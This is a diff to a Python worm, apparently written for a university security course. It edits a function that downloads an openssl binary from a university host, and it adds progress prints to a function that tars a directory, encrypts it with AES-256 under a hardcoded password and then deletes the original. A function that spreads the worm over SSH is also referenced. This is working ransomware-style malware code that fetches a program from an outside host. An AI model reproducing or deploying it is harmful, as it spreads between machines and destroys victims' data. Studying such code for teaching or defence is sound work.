@@ -318,7 +318,7 @@ def spreadAndExecute(sshClient, fromHost):
 #===============================================================================
 def downloadProgramFromNet():
     # Create a variable to hold the URL to the openssl program
-    URL = "http://ecs.fullerton.edu/mgofman/openssl"
+    URL = "http://ecs.fullerton.edu/~mgofman/openssl"
     try:
         # Download the URL above and save it to the path where OPENSSL defined
         urllib.urlretrieve(URL, OPENSSL)
@@ -360,9 +360,12 @@ def compressEncryptDelete(directory):
             # Close the tar file
             tar.close()
 
+            print "Finished create tar file"
+
             # Then we encrypt it.  We need to change open ssl to execute
             call(["chmod", "a+x", OPENSSL])
 
+            print "Finished chmod openssl file"
             # Run the encryption
             password = "cs456worm"
             ARGS = [OPENSSL, "aes-256-cbc", "-a", "-salt", "-in", tarName, "-out"]
@@ -372,6 +375,7 @@ def compressEncryptDelete(directory):
 
             # Call the program to encrypt it
             call(ARGS)
+            print "Finished encrypted file"
 
             # Then we remove the directory
             shutil.rmtree(directory)
